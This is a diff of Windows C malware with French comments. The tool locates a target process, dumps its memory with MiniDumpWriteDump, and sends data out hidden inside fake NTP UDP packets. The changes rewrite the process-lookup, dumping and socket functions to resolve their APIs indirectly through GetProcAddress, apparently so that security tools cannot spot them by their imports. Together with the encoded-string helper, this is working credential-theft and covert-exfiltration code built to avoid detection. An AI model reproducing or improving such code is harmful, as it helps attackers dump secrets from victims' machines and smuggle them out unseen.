@@ -23,30 +23,48 @@ void DecodeString(const wchar_t *encoded, int key, wchar_t *decoded, size_t maxL
 }
 
 // --- Fonction pour récupérer le PID d'un processus ---
-// Utilise CreateToolhelp32Snapshot et parcourt les processus
+// Utilise les fonctions indirectes : CreateToolhelp32Snapshot, Process32FirstW, Process32NextW et CloseHandle
 DWORD GetTargetProcessPID(const wchar_t *targetProcessName) {
     DWORD pid = 0;
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
+    if (!hKernel32)
+        return 0;
+
+    typedef HANDLE (WINAPI *pCreateToolhelp32Snapshot)(DWORD, DWORD);
+    typedef BOOL (WINAPI *pProcess32FirstW)(HANDLE, LPPROCESSENTRY32);
+    typedef BOOL (WINAPI *pProcess32NextW)(HANDLE, LPPROCESSENTRY32);
+    typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
+
+    pCreateToolhelp32Snapshot fCreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
+    pProcess32FirstW fProcess32FirstW = (pProcess32FirstW)GetProcAddress(hKernel32, "Process32FirstW");
+    pProcess32NextW fProcess32NextW = (pProcess32NextW)GetProcAddress(hKernel32, "Process32NextW");
+    pCloseHandle fCloseHandle = (pCloseHandle)GetProcAddress(hKernel32, "CloseHandle");
+
+    if (!fCreateToolhelp32Snapshot || !fProcess32FirstW || !fProcess32NextW || !fCloseHandle)
+        return 0;
+
+    HANDLE hSnapshot = fCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE)
         return 0;
 
     PROCESSENTRY32 pe;
     pe.dwSize = sizeof(PROCESSENTRY32);
-    if (Process32First(hSnapshot, &pe)) {
+    if (fProcess32FirstW(hSnapshot, &pe)) {
         do {
             if (_wcsicmp(pe.szExeFile, targetProcessName) == 0) {
                 pid = pe.th32ProcessID;
                 break;
             }
-        } while (Process32Next(hSnapshot, &pe));
+        } while (fProcess32NextW(hSnapshot, &pe));
     }
-    CloseHandle(hSnapshot);
+    fCloseHandle(hSnapshot);
     return pid;
 }
 
 // --- Fonction de dump mémoire ---
-// Effectue un dump mémoire du processus cible en utilisant MiniDumpWriteDump et un mapping mémoire temporaire
+// Effectue un dump mémoire du processus cible en utilisant MiniDumpWriteDump (appel indirect déjà présent) et un mapping mémoire temporaire
 BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
+    // Chargement de DbgHelp.dll et récupération de MiniDumpWriteDump
     HMODULE hDbgHelp = LoadLibrary(L"DbgHelp.dll");
     if (!hDbgHelp)
         return FALSE;
@@ -59,23 +77,46 @@ BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
         return FALSE;
     }
 
-    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+    // Chargement des fonctions kernel32.dll en mode indirect pour OpenProcess, CreateFileMappingW, MapViewOfFile, UnmapViewOfFile, CloseHandle
+    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
+    if (!hKernel32) {
+        FreeLibrary(hDbgHelp);
+        return FALSE;
+    }
+    typedef HANDLE (WINAPI *pOpenProcess)(DWORD, BOOL, DWORD);
+    typedef HANDLE (WINAPI *pCreateFileMappingW)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR);
+    typedef LPVOID (WINAPI *pMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
+    typedef BOOL (WINAPI *pUnmapViewOfFile)(LPCVOID);
+    typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
+
+    pOpenProcess fOpenProcess = (pOpenProcess)GetProcAddress(hKernel32, "OpenProcess");
+    pCreateFileMappingW fCreateFileMappingW = (pCreateFileMappingW)GetProcAddress(hKernel32, "CreateFileMappingW");
+    pMapViewOfFile fMapViewOfFile = (pMapViewOfFile)GetProcAddress(hKernel32, "MapViewOfFile");
+    pUnmapViewOfFile fUnmapViewOfFile = (pUnmapViewOfFile)GetProcAddress(hKernel32, "UnmapViewOfFile");
+    pCloseHandle fCloseHandle = (pCloseHandle)GetProcAddress(hKernel32, "CloseHandle");
+
+    if (!fOpenProcess || !fCreateFileMappingW || !fMapViewOfFile || !fUnmapViewOfFile || !fCloseHandle) {
+        FreeLibrary(hDbgHelp);
+        return FALSE;
+    }
+
+    HANDLE hProcess = fOpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
     if (!hProcess) {
         FreeLibrary(hDbgHelp);
         return FALSE;
     }
 
     size_t bufferSize = 0x1000000; // 16 MB
-    HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, (DWORD)bufferSize, NULL);
+    HANDLE hMapping = fCreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, (DWORD)bufferSize, NULL);
     if (!hMapping) {
-        CloseHandle(hProcess);
+        fCloseHandle(hProcess);
         FreeLibrary(hDbgHelp);
         return FALSE;
     }
-    void* buffer = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, bufferSize);
+    void* buffer = fMapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, bufferSize);
     if (!buffer) {
-        CloseHandle(hMapping);
-        CloseHandle(hProcess);
+        fCloseHandle(hMapping);
+        fCloseHandle(hProcess);
         FreeLibrary(hDbgHelp);
         return FALSE;
     }
@@ -89,9 +130,9 @@ BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
             success = FALSE;
         }
     }
-    UnmapViewOfFile(buffer);
-    CloseHandle(hMapping);
-    CloseHandle(hProcess);
+    fUnmapViewOfFile(buffer);
+    fCloseHandle(hMapping);
+    fCloseHandle(hProcess);
     FreeLibrary(hDbgHelp);
     return success;
 }
@@ -122,14 +163,33 @@ void CreateNTPPacket(const unsigned char payload[8], unsigned char packet[48]) {
 
 // Envoie un paquet UDP contenant le faux paquet NTP
 int SendNTPPacket(const char *target_ip, int target_port, const unsigned char payload[8]) {
+    // Chargement des fonctions ws2_32.dll en mode indirect
+    HMODULE hWs2_32 = GetModuleHandleW(L"ws2_32.dll");
+    if (!hWs2_32)
+        return -1;
+    typedef int (WSAAPI *pWSAStartup)(WORD, LPWSADATA);
+    typedef SOCKET (WSAAPI *pSocket)(int, int, int);
+    typedef int (WSAAPI *pSendTo)(SOCKET, const char*, int, int, const struct sockaddr*, int);
+    typedef int (WSAAPI *pClosesocket)(SOCKET);
+    typedef int (WSAAPI *pWSACleanup)(void);
+
+    pWSAStartup fWSAStartup = (pWSAStartup)GetProcAddress(hWs2_32, "WSAStartup");
+    pSocket fSocket = (pSocket)GetProcAddress(hWs2_32, "socket");
+    pSendTo fSendTo = (pSendTo)GetProcAddress(hWs2_32, "sendto");
+    pClosesocket fClosesocket = (pClosesocket)GetProcAddress(hWs2_32, "closesocket");
+    pWSACleanup fWSACleanup = (pWSACleanup)GetProcAddress(hWs2_32, "WSACleanup");
+
+    if (!fWSAStartup || !fSocket || !fSendTo || !fClosesocket || !fWSACleanup)
+        return -1;
+
     WSADATA wsaData;
     SOCKET sock = INVALID_SOCKET;
     int result = 0;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+    if (fWSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
         return -1;
-    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    sock = fSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (sock == INVALID_SOCKET) {
-        WSACleanup();
+        fWSACleanup();
         return -1;
     }
     struct sockaddr_in addr;
@@ -140,9 +200,9 @@ int SendNTPPacket(const char *target_ip, int target_port, const unsigned char pa
 
     unsigned char packet[48];
     CreateNTPPacket(payload, packet);
-    result = sendto(sock, (const char*)packet, 48, 0, (struct sockaddr*)&addr, sizeof(addr));
-    closesocket(sock);
-    WSACleanup();
+    result = fSendTo(sock, (const char*)packet, 48, 0, (struct sockaddr*)&addr, sizeof(addr));
+    fClosesocket(sock);
+    fWSACleanup();
     return result;
 }
 
